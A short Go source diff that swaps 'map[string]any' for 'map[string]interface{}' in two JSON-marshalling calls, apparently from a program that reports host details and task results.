@@ -76,7 +76,7 @@ func system_info() []byte {
 		address = conn.LocalAddr().(*net.UDPAddr).IP.String()
 	}
 
-	data, err := json.Marshal(map[string]any{
+	data, err := json.Marshal(map[string]interface{}{
 		"address":      address,
 		"hostname":     hostname,
 		"os":           runtime.GOOS,
@@ -320,7 +320,7 @@ func main() {
 			}
 			fmt.Println("Task: ", task.ID, "Output: ", output, "Success: ", success)
 
-			data, err := json.Marshal(map[string]any{
+			data, err := json.Marshal(map[string]interface{}{
 				"task":    task.ID,
 				"output":  output,
 				"success": success,
